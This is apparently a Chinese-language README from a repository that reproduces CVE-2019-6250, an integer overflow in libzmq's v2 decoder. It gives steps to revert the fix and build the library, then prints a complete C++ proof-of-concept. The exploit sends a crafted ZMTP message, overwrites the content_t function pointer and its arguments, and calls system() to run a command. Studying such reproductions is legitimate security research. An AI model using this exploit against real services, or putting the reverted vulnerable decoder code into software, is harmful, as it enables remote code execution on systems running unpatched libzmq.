# CVE-2019-6250-libzmq

## ZeroMQ(ZMQ)
ZeroMQ(ZMQ)是一个高性能的异步消息库，旨在为分布式或并行计算环境提供一个高效、灵活的消息传递机制。ZeroMQ提供了多种消息传递模式（如请求-应答、发布-订阅、推送-拉取、代理等），并支持多种传输协议（如TCP、IPC、PGM等）。ZeroMQ的设计目标是简化网络编程，并通过提供高效的消息队列来提升性能。

## libzmq
libzmq是ZeroMQ的核心实现库，通常指ZeroMQ库的C语言实现。它是ZeroMQ功能的具体实现，为各种编程语言提供基础支持。libzmq提供了所有ZeroMQ的核心功能，并可以与多种语言绑定一起使用。

## 攻击方式

下载libzmq库

	git clone https://github.com/zeromq/libzmq.git
	cd libzmq
	git reset --hard 7302b9b8d127be5aa1f1ccebb9d01df0800182f3

作者已经修复该漏洞，进入src/v2_decoder.cpp下，修改函数zmq::v2_decoder_t::size_ready的内容为以下代码来复现漏洞：

	int zmq::v2_decoder_t::size_ready (uint64_t msg_size_,unsigned char const *read_pos_)
	{
	    int rc = _in_progress.close ();
	    assert (rc == 0);
	
	    // the current message can exceed the current buffer. We have to copy the buffer
	    // data into a new message and complete it in the next receive.
	
	    shared_message_memory_allocator &allocator = get_allocator ();
	    if (unlikely (!_zero_copy
	                  || ((unsigned char *) read_pos_ + msg_size_
	                      > (allocator.data () + allocator.size ())))) {
	        // a new message has started, but the size would exceed the pre-allocated arena
	        // this happens every time when a message does not fit completely into the buffer
	        rc = _in_progress.init_size (static_cast<size_t> (msg_size_));
	    } else {
	        // construct message using n bytes from the buffer as storage
	        // increase buffer ref count
	        // if the message will be a large message, pass a valid refcnt memory location as well
	        rc =
	          _in_progress.init (const_cast<unsigned char *> (read_pos_),
	                             static_cast<size_t> (msg_size_),
	                             shared_message_memory_allocator::call_dec_ref,
	                             allocator.buffer (), allocator.provide_content ());
	
	        // For small messages, data has been copied and refcount does not have to be increased
	        if (_in_progress.is_zcmsg ()) {
	            allocator.advance_content ();
	            allocator.inc_ref ();
	        }
	    }
	
	    if (unlikely (rc)) {
	        errno_assert (errno == ENOMEM);
	        rc = _in_progress.init ();
	        errno_assert (rc == 0);
	        errno = ENOMEM;
	        return -1;
	    }
	
	    _in_progress.set_flags (_msg_flags);
	    // this sets read_pos to
	    // the message data address if the data needs to be copied
	    // for small message / messages exceeding the current buffer
	    // or
	    // to the current start address in the buffer because the message
	    // was constructed to use n bytes from the address passed as argument
	    next_step (_in_progress.data (), _in_progress.size (),
	               &v2_decoder_t::message_ready);
	
	    return 0;
	}

安装libzmq库

	sudo apt-get install libtool pkg-config build-essential autoconf
	automake
	./autogen.sh
	./configure
	make
	sudo make install

下载安装cppzmq

	git clone https://github.com/zeromq/cppzmq
	cd cppzmq
	cmake .
	sudo make -j4 install

将/demo/main.cpp替换为本仓库中的main.cpp

编译main.cpp

	cd demo
	mkdir build
	cd build
	cmake ..
	make
	./demo

## 漏洞触发位置

Libzmq/src/v2_decoder.cpp的以下内容存在整数溢出。当msg_size_的值非常大时，read_pos+msg_size_反而是个非常小的数，进而if判断为false，程序不会初始化消息大小。
    if (unlikely (!_zero_copy
                  || ((unsigned char *) read_pos_ + msg_size_
                      > (allocator.data () + allocator.size ())))) {

因此可以用写入的消息覆盖缓冲区后面的内存。而缓冲区后面的内存为一个结构体content_t，其中包含函数指针ffn以及函数参数data和hint。
67     struct content_t
 68     {
 69         void *data;
 70         size_t size;
 71         msg_free_fn *ffn;
 72         void *hint;
 73         zmq::atomic_counter_t refcnt;
 74     };


## 漏洞利用

通过控制传递的消息，进而将上述函数指针和参数覆写为特定函数及其参数，即可实现攻击。

	#include <netinet/in.h>
	#include <arpa/inet.h>
	#include <zmq.hpp>
	#include <string>
	#include <iostream>
	#include <unistd.h>
	#include <thread>
	#include <mutex>
	
	class Thread {
	    public:
	    Thread() : the_thread(&Thread::ThreadMain, this)
	    { }
	    ~Thread(){
	    }
	    private:
	    std::thread the_thread;
	    void ThreadMain() {
	        zmq::context_t context (1);
	        zmq::socket_t socket (context, ZMQ_REP);
	        socket.bind ("tcp://*:6666");
	
	        while (true) {
	            zmq::message_t request;
	
	            // Wait for next request from client
	            try {
	                socket.recv (&request);
	            } catch ( ... ) { }
	        }
	    }
	};
	
	static void callRemoteFunction(const uint64_t arg1Addr, const uint64_t arg2Addr, const uint64_t funcAddr)
	{
	    int s;
	    struct sockaddr_in remote_addr = {};
	    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	    {
	        abort();
	    }
	    remote_addr.sin_family = AF_INET;
	    remote_addr.sin_port = htons(6666);
	    inet_pton(AF_INET, "127.0.0.1", &remote_addr.sin_addr);
	
	    if (connect(s, (struct sockaddr *)&remote_addr, sizeof(struct sockaddr)) == -1)
	    {
	        abort();
	    }
	
	    const uint8_t greeting[] = {
	        0xFF, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Unused */
	        0x01, /* Indicates 'versioned' in zmq::stream_engine_t::receive_greeting */
	        0x01, /* Selects ZMTP_2_0 in zmq::stream_engine_t::select_handshake_fun */
	        0x00, /* Unused */
	    };
	    send(s, greeting, sizeof(greeting), 0);
	
	    const uint8_t v2msg[] = {
	        0x02, /* v2_decoder_t::eight_byte_size_ready */
	        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, /* msg_size */
	    };
	    send(s, v2msg, sizeof(v2msg), 0);
	
	    /* Write UNTIL the location of zmq::msg_t::content_t */
	    size_t plsize = 8183;
	    uint8_t* pl = (uint8_t*)calloc(1, plsize);
	    send(s, pl, plsize, 0);
	    free(pl);
	
	    uint8_t content_t_replacement[] = {
	        /* void* data */
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	
	        /* size_t size */
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	
	        /* msg_free_fn *ffn */
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	
	        /* void* hint */
	        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	    };
	
	    /* Assumes same endianness as target */
	    memcpy(content_t_replacement + 0, &arg1Addr, sizeof(arg1Addr));
	    memcpy(content_t_replacement + 16, &funcAddr, sizeof(funcAddr));
	    memcpy(content_t_replacement + 24, &arg2Addr, sizeof(arg2Addr));
	
	    /* Overwrite zmq::msg_t::content_t */
	    send(s, content_t_replacement, sizeof(content_t_replacement), 0);
	
	    close(s);
	    sleep(1);
	}
	
	char destbuffer[100];
	char srcbuffer[100] = "ping google.com";
	
	int main(void)
	{
	    Thread* rt = new Thread();
	    sleep(1);
	
	    callRemoteFunction((uint64_t)destbuffer, (uint64_t)srcbuffer, (uint64_t)strcpy);
	
	    callRemoteFunction((uint64_t)destbuffer, 0, (uint64_t)system);
	
	    return 0;
	}

